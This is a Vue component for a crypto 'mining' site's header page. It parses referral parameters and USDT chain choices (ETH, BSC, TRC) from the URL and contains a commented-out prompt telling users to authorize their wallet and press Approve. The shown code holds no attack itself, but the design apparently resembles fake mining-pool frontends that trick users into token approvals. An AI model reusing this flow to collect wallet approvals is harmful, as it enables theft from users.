<template>
  <div class="app">
    <div class="header">
      <div class="left">
        <router-link :to="homeMain">
          <a href="">
            <i class="el-icon-s-home"></i>
            HOME
          </a>
        </router-link>
        <router-link :to="homeShore" v-if="this.falg">
          <a href="">
            <i class="iconfont icon-fenxiang"></i>
            SHARE
          </a>
        </router-link>
      </div>
      <div class="center">
        <img src="../images/ethereum.svg" alt="" style="width: 5.93333333vw;" v-if="this.defaultObj.id == 1">
        <img src="../images/logo-bscscan.png" alt="" style="width: 5.93333333vw;" v-if="this.defaultObj.id == 2">
        <img src="../images/logo_left.251720b2.png" alt="" style="width: 5.93333333vw;" v-if="this.defaultObj.id == 3">
        <span id="lang_title">minering</span>
      </div>
      <div class="me">
        <router-link to="/home/me" v-if="this.falg">
          <a href="">
            <i class="el-icon-user-solid"></i>
            ACCOUNT
          </a>
        </router-link>
        <a @click="quit">
          <i class="iconfont  icon-icon"></i>
          QUIT
        </a>
      </div>
    </div>
    <div style="height: 50vw">
      <router-view></router-view>
    </div>

    <!-- <el-dialog title="Website application authorizes your wallet" :visible.sync="falg" width="60%" center>
      <span style="text-align: center;display:block;">1.If the license does not respond, click the Reset button below to
        clear the corresponding (Eth/Bsc/Trc) link information</span>
      <br />
      <span style="text-align: center;display:block;">2.If you have connected wallet but do not pull 'App Wallet
        Authorization 'for a long time, please return to this page to refresh and click Authorization again</span>
      <br />
      <span style="text-align: center;display:block;">3.After 'agree to grant' may need to wait on the chain Peeding,
        perhaps you should wait for a while on this page</span>
      <span slot="footer" class="dialog-footer">
        <el-button>Reset</el-button>
        <el-button type="primary">Approve</el-button>
      </span>
    </el-dialog> -->

    <HomeTabContainer></HomeTabContainer>
  </div>
</template> 
<script>
// 封装的调用钱包方法
import BlockChain from "../blockchain/BlockChainBase"
// 引用状态机
import { createNamespacedHelpers } from "vuex";
// 封装的自动注册方法
import { autoRegister } from '../utils/myRegisterUtils'
const blockUtils = new BlockChain();
// 获取状态机内部封装的方法
const { mapState, mapMutations, mapActions } = createNamespacedHelpers("Home");
export default {
  name: 'Tab_container_MiningPool',
  data() {
    return {
      falg: false,
      defaultObj: {
        str: 'minering',
        chainType: 'ETH',
        id: 1
      },
      arr: [],
      search:''
    }
  },

  computed: {
    ...mapState(['obj', 'Msg'])
  },
  methods: {
    ...mapActions(['GetUserId', 'GoAutoRegister']),
    async finshdata() {
      this.init()
      //如果有数据
      if (this.$route.query.data) {
        // 解析到有数据就隐藏个人中心
        this.falg = true
        // 点击授权 解析restful数据
        let res = this.$route.query.data;
        let ar = res.split('?')
        let arr = []
        ar.forEach((item, index) => {
          if (index != ar.length - 1) {
            let b = item.split('=');
            let obj = {};
            obj[b[0]] = b[1];
            arr.push(obj)
          }
        })
        console.log(arr);
        this.arr = arr;
        // 获取解析后的账号id
        let userId = arr[0].userParentId
        console.log(arr);
        // 发送请求获取账号地址
        await this.GetUserId({ id: userId })
        console.log(this.obj);
        // 如果是一级用户
        if (this.arr.length == 2) {
          // 添加授权用户对应链地址 
          if (this.arr[1].eth_usdt) {
            this.defaultObj = {
              str: 'ETH',
              chainType: 'ETH',
              id: 1
            }
          } else if (this.arr[1].bsc_usdt) {
            this.defaultObj = {
              str: 'BSC',
              chainType: 'BNB',
              id: 2
            }
          } else if (this.arr[1].trc_usdt) {
            this.defaultObj = {
              str: 'TRC',
              chainType: 'TRX',
              id: 3
            }
          }
        } else {
          // 如果是二级用户及以上
          // 添加授权用户对应链地址
          //区块链类型
          var chainType = ar[1].split('=')[0].split('_')[0].toUpperCase()
          var agentAddress
          console.log(this.obj);
          if (chainType == 'ETH') {
            agentAddress = this.obj.ethMainnetAddress + '-ETH'
          }
          else if (chainType == 'BSC') {
            agentAddress = this.obj.bscMainnetAddress + '-BSC'
          }
          else if (chainType == 'TRC') {
            agentAddress = this.obj.trcMainnetAddress + '-TRC'
          }
          else {
            agentAddress = this.obj.ancestorAddress
          }
          let agentAdressArr = agentAddress.split('-')
          if (agentAdressArr[1] == 'ETH') {
            this.defaultObj = {
              str: 'ETH',
              chainType: 'ETH',
              id: 1
            }
          }
          else if (agentAdressArr[1] == 'BSC') {
            this.defaultObj = {
              str: 'BSC',
              chainType: 'BNB',
              id: 2
            }
          }
          else if (agentAdressArr[1] == 'TRC') {
            this.defaultObj = {
              str: 'TRC',
              chainType: 'TRX',
              id: 3
            }
          }
        }
      }
      console.log(this.defaultObj);
      sessionStorage.setItem("defaultObj", JSON.stringify(this.defaultObj));
    },
    quit() {
      this.$message({
        message: '退出成功',
        type: 'success'
      });
      // 点击退出登录
      // 清空本地存储，跳转到登录页
      sessionStorage.removeItem("token");
      sessionStorage.removeItem("user");
      // location.replace('/') //跳回登录地址
      setTimeout(() => {
        window.location.href = "/";
      }, 500);
    },
    getRandomString(len) {
            let _charStr = 'abacdefghjklmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ0123456789',
                min = 0,
                max = _charStr.length - 1,
                _str = '';                    //定义随机字符串 变量
            //判断是否指定长度，否则默认长度为15
            len = len || 15;
            //循环生成字符串
            for (var i = 0, index; i < len; i++) {
                index = (function (randomIndexFunc, i) {
                    return randomIndexFunc(min, max, i, randomIndexFunc);
                })(function (min, max, i, _self) {
                    let indexTemp = Math.floor(Math.random() * (max - min + 1) + min),
                        numStart = _charStr.length - 10;
                    if (i == 0 && indexTemp >= numStart) {
                        indexTemp = _self(min, max, i, _self);
                    }
                    return indexTemp;
                }, i);
                _str += _charStr[index];
            }
            return _str;
        },
        init() {
          this.homeShore='/home/shore'+window.location.search
          this.homeMain='/home/main'+window.location.search
        },
  },
  created() {
    this.finshdata()
  }
}

</script>
<style scoped>
.app {
  /* height: 100vw; */
  display: flex;
  flex-direction: column;
  /* background-image: url(../images/loginleftbg.6cfc269.jpg); */
  /* background-image: url(../images/banner_home2.483edd9e.png); */
  background-repeat: no-repeat;
  background-size: 100% 100%;
}

.big {
  width: 100%;
  height: 100%;
  position: absolute;
  left: 0;
  top: 0;
  background-color: rgba(0, 0, 0, 0.3);
}

.box {
  width: 30%;
  height: 30%;
  position: absolute;
  left: 33%;
  transform: translateX(-50%);
  top: 40%;
  transform: translateY(-50%);
  background-color: white;
  border: 1px solid gray;
  border-radius: 5px;
  box-shadow: 10px 10px 5px gray;
}

.box>p {
  font-size: 32px;
  width: 90%;
  height: 20%;
  margin: 20px auto;
  line-height: 200%;
  text-align: center;
  /* background-color: aqua; */
}

w button {
  width: 30%;
  height: 15%;
  margin-left: 70px;
  margin-top: 30px;
  font-size: 24px;
  border-radius: 8px;
  outline: none;
  border: none;
  color: white;
}

button:nth-of-type(1) {
  background-color: rgb(41, 200, 248);
}

button:nth-of-type(2) {
  background-color: rgb(255, 87, 65);
}

.header {
  height: 150px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding-top: 2vw;
  background-color: #1652F0;
}


.left {
  display: flex;
  width: 150px;
  justify-content: space-evenly;
}

#lang_title {
  margin-left: 1.06666667vw;
  font-size: 3.53333333vw;
  font-weight: 600;
  color: #fff;
}

.left a {
  display: flex;
  flex-direction: column;
  align-items: center;
  color: white;
}

.left a i {
  font-size: 25px;
}

.center {
  display: flex;
  justify-content: center;
  align-items: center;
}

.me {
  display: flex;
  width: 180px;
  justify-content: space-evenly;
  align-items: center;
}

.me a {
  display: flex;
  flex-direction: column;
  align-items: center;
  color: white;
}

.me a i {
  font-size: 25px;
}
</style>